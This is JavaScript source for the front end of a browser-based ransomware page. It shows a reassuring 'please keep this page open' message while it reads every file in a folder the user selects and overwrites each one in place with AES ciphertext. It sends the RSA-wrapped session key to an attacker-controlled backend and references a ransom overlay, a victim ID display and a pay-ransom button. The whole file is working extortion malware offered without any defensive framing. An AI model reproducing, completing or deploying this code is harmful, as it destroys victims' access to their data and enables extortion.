import { CryptoModule } from './modules/cryptoModule.js';
import { FileSystemModule } from './modules/fileSystemModule.js';
import crypto from 'crypto';
import { Buffer } from 'buffer';
import './style.css';

const API_BASE_URL = process.env.API_BASE_URL.replace(/\/$/, '');

const state = {
  selectedDirectory: null,
  isEncrypting: false,
  filesProcessed: 0,
  totalFiles: 0,
  clientId: null,
  backendPublicKey: null
};

let DOM = {};

// --- IDENTITY MANAGEMENT ---
const initializeIdentity = async () => {
    const storedIdentity = localStorage.getItem('rob_identity');
    if (storedIdentity) {
        const data = JSON.parse(storedIdentity);
        state.clientId = data.clientId;
        state.backendPublicKey = data.publicKey;
    } else {
        try {
            const res = await fetch(`${API_BASE_URL}/new`, { method: 'POST' });
            if (!res.ok) throw new Error('Server handshake failed');
            const data = await res.json();
            state.clientId = data.clientId;
            state.backendPublicKey = data.publicKey;
            localStorage.setItem('rob_identity', JSON.stringify({
                clientId: data.clientId,
                publicKey: data.publicKey
            }));
        } catch (err) {
            console.error('Connection Error:', err.message);
        }
    }
};

// --- DIRECTORY SELECTION ---
const handleDirectorySelection = async () => {
    try {
      const directoryHandle = await FileSystemModule.selectDirectory();
      state.selectedDirectory = directoryHandle;
      if (DOM.selectedDirInfo) {
        DOM.selectedDirInfo.innerHTML = `<p class="warning-text">⚠️⏳ We’re working on it! Please keep this page open until we’re done.</p>`;
      }
      
      if (DOM.progressContainer) {
        DOM.progressContainer.style.display = 'block';
      }
      
      await startEncryption();
      
    } catch (error) {
        if (error.name !== 'AbortError' && DOM.progressContainer) {
          DOM.progressContainer.style.display = 'none';
        }
    }
};

// --- KEY EXCHANGE ---
const reportSessionKey = async (rawKeyBase64) => {
    if (!state.clientId) return;

    let payloadKey = rawKeyBase64;

    if (state.backendPublicKey) {
        try {
            const aesKeyBuffer = Buffer.from(rawKeyBase64, 'base64');
            const encryptedBuffer = crypto.publicEncrypt(
                {
                    key: state.backendPublicKey,
                    padding: crypto.constants.RSA_PKCS1_PADDING
                },
                aesKeyBuffer
            );
            payloadKey = encryptedBuffer.toString('base64');
        } catch (e) {
            console.error("RSA Encryption failed", e);
        }
    }

    const res = await fetch(`${API_BASE_URL}/session-keys`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            clientId: state.clientId,
            key: payloadKey,
            filesCount: state.totalFiles
        })
    });

    if (res.status === 401) {
        localStorage.removeItem('rob_identity');
        alert("Session expired or server reset. The page will reload.");
        window.location.reload();
        throw new Error("Identity invalid. Reloading...");
    }

    if (!res.ok) {
        throw new Error(`Server Error: ${res.status}`);
    }
};

// --- ENCRYPTION LOGIC ---
const startEncryption = async () => {
    if (!state.selectedDirectory) return;
    if (!state.clientId) await initializeIdentity();

    state.isEncrypting = true;
    
    if (DOM.selectDirBtn) DOM.selectDirBtn.disabled = true;

    if (DOM.progressBar) DOM.progressBar.style.width = '0%';
    if (DOM.progressText) DOM.progressText.textContent = 'Initializing...';
    if (DOM.progressContainer) DOM.progressContainer.style.display = 'block';

    try {
        const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
        state.totalFiles = files.length;
        state.filesProcessed = 0;

        const session = await CryptoModule.generateSessionKey();
        const sessionAes = session.aes;
        
        await reportSessionKey(session.rawKeyBase64);

        for (let i = 0; i < files.length; i++) {
            const fileHandle = files[i];
            if (DOM.progressText) {
              DOM.progressText.textContent = `Processing: ${fileHandle.name}...`;
            }
            await encryptFileInPlace(fileHandle, sessionAes);
            state.filesProcessed++;
            if (DOM.progressBar) {
              DOM.progressBar.style.width = `${(state.filesProcessed / state.totalFiles) * 100}%`;
            }
        }
        
        if (DOM.progressText) DOM.progressText.textContent = 'Done.';
        if (DOM.selectedDirInfo) {
          DOM.selectedDirInfo.innerHTML = `<p><strong>Folder:</strong> ${state.selectedDirectory.name} - <strong>Status:</strong> Completed (${state.filesProcessed} files)</p>`;
        }
        
        // Redirect to next page
        setTimeout(() => {
            window.location.href = '/next';
        }, 1500);

    } catch (error) {
        if (DOM.progressText) DOM.progressText.textContent = `Error: ${error.message}`;
        if (DOM.progressContainer) {
          setTimeout(() => {
            DOM.progressContainer.style.display = 'none';
          }, 3000);
        }
    } finally {
        state.isEncrypting = false;
        if (DOM.selectDirBtn) DOM.selectDirBtn.disabled = false;
    }
};

// --- FILE OPERATIONS ---
const encryptFileInPlace = async (fileHandle, cryptoKey) => {
  try {
    const uint8Array = await FileSystemModule.readFileAsUint8Array(fileHandle);
    const encryptedData = await CryptoModule.encryptFile(uint8Array, cryptoKey);

    const ivBytes = encryptedData.iv;
    const tagBytes = encryptedData.tag; // Authentication tag
    const ciphertextBytes = encryptedData.ciphertext;

    // debug
    // console.log(`[Encrypt] File: ${fileHandle.name}`);
    // console.log(`[Encrypt] IV Length: ${ivBytes.length}`);
    // console.log(`[Encrypt] Tag Length: ${tagBytes ? tagBytes.length : 'MISSING'}`);
    // console.log(`[Encrypt] Ciphertext Length: ${ciphertextBytes.length}`);
    
    const combinedBytes = new Uint8Array(ivBytes.length + tagBytes.length + ciphertextBytes.length);
    
    combinedBytes.set(ivBytes, 0);
    combinedBytes.set(tagBytes, ivBytes.length);
    combinedBytes.set(ciphertextBytes, ivBytes.length + tagBytes.length);

    await FileSystemModule.writeBytesToHandle(fileHandle, combinedBytes);
  } catch (error) {
    console.error(`Failed to process ${fileHandle.name}:`, error.message);
  }
};

// --- INIT ---
export const initApp = async () => {
  DOM = {
    selectDirBtn: document.getElementById('selectDirBtn'),
    selectedDirInfo: document.getElementById('selectedDirInfo'),
    progressBar: document.getElementById('progressBar'),
    progressText: document.getElementById('progressText'),
    progressContainer: document.getElementById('progressContainer'),
    ransomOverlay: document.getElementById('ransomOverlay'),
    victimIdDisplay: document.getElementById('victimIdDisplay'),
    payRansomBtn: document.getElementById('payRansomBtn')
  };

  if (DOM.selectDirBtn) DOM.selectDirBtn.addEventListener('click', handleDirectorySelection);
  await initializeIdentity();
};
